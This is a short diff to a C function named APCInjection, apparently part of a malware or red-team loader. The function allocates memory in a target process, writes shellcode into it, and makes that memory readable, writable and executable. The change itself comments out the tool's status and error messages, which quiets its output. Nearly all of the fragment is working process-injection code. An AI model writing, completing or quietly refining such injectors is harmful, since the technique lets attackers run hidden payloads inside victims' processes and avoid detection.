@@ -68,29 +68,29 @@ BOOL APCInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShel
 
 	if ((STATUS = NTAVM(hProcess, ppAddress, 0, &sSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)) != 0) {
 
-		printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
+		//printf("[!] NtAllocateVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
 
-	//printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);
+	////printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);
 
 	if ((STATUS = NTWVM(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten)) != 0 || sNumberOfBytesWritten != sSizeOfShellcode) {
 
-		printf("[!] NtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
+		//printf("[!] NtWriteVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
 
-	printf("[+] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
+	//printf("[+] Successfully Written %d Bytes\n", sNumberOfBytesWritten);
 
 
 	Sleep(2500);
 	if ((STATUS = NTPVM(hProcess, ppAddress, &sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &uOldProtection)) != 0) {
 
-		printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
+		//printf("[!] NtProtectVirtualMemory Failed With Error : 0x%0.8X \n", STATUS);
 		return FALSE;
 	}
 
-	printf("[+] Successfully changed memory region permission to RWX!\n");
+	//printf("[+] Successfully changed memory region permission to RWX!\n");
 
 	return TRUE;
 
